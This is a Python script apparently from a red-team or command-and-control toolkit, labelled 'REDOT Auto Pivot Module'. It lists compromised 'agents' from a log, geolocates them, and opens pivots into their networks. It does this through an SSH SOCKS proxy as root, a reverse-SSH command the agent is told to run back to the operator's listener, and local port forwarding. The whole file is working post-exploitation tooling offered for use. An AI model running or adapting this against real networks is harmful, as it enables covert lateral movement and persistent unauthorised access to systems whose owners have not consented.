#!/usr/bin/env python3
import os
import subprocess
import socket
import json
import time

AGENT_LOG = "logs/agents.json"
PIVOT_LOG = "logs/pivots.log"
LISTENER_IP = socket.gethostbyname(socket.gethostname())

def ensure_logs():
    os.makedirs("logs", exist_ok=True)
    if not os.path.exists(AGENT_LOG):
        with open(AGENT_LOG, "w") as f:
            json.dump([], f)
    if not os.path.exists(PIVOT_LOG):
        open(PIVOT_LOG, "w").close()

def register_pivot(agent_ip, method, port):
    with open(PIVOT_LOG, "a") as f:
        f.write(f"{time.ctime()} | Pivot: {agent_ip} via {method} on port {port}\n")
    print(f"[+] Pivot established: {agent_ip} via {method} on port {port}")

def start_socks_proxy(agent_ip):
    port = 1080
    print(f"[*] Starting SOCKS proxy through {agent_ip}:{port}")
    cmd = ["ssh", "-N", "-D", str(port), f"root@{agent_ip}"]
    subprocess.Popen(cmd)
    register_pivot(agent_ip, "SOCKS", port)

def start_reverse_ssh(agent_ip):
    port = 2222
    print(f"[*] Instruct agent to reverse SSH to {LISTENER_IP}:{port}")
    cmd = f"ssh -R {port}:localhost:22 root@{LISTENER_IP}"
    print(f"[!] Agent should execute: {cmd}")
    register_pivot(agent_ip, "ReverseSSH", port)

def dynamic_tunnel(agent_ip, remote_port, local_port):
    print(f"[*] Setting up dynamic tunnel from {LISTENER_IP}:{local_port} to {agent_ip}:{remote_port}")
    cmd = ["ssh", "-N", "-L", f"{local_port}:localhost:{remote_port}", f"root@{agent_ip}"]
    subprocess.Popen(cmd)
    register_pivot(agent_ip, "LocalForward", local_port)

def geoip_lookup(ip):
    try:
        import requests
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        return r.get("countryCode", "Unknown")
    except:
        return "Unknown"

def main():
    ensure_logs()
    print("=== REDOT Auto Pivot Module ===")
    print("Available Agents:")

    with open(AGENT_LOG) as f:
        agents = json.load(f)

    for idx, agent in enumerate(agents):
        print(f"[{idx}] {agent['name']} - {agent['ip']} ({geoip_lookup(agent['ip'])})")

    choice = input("Select agent index for pivot: ").strip()
    if not choice.isdigit() or int(choice) >= len(agents):
        print("[-] Invalid selection.")
        return

    agent = agents[int(choice)]
    print(f"[+] Selected: {agent['name']} @ {agent['ip']}")

    print("1. SOCKS Proxy")
    print("2. Reverse SSH")
    print("3. Local Port Forward")
    mode = input("Select pivot mode (1/2/3): ").strip()

    if mode == "1":
        start_socks_proxy(agent["ip"])
    elif mode == "2":
        start_reverse_ssh(agent["ip"])
    elif mode == "3":
        rport = input("Remote port to forward: ").strip()
        lport = input("Local port to bind: ").strip()
        if rport.isdigit() and lport.isdigit():
            dynamic_tunnel(agent["ip"], int(rport), int(lport))
        else:
            print("[-] Invalid ports.")
    else:
        print("[-] Invalid mode.")

if __name__ == "__main__":
    main()
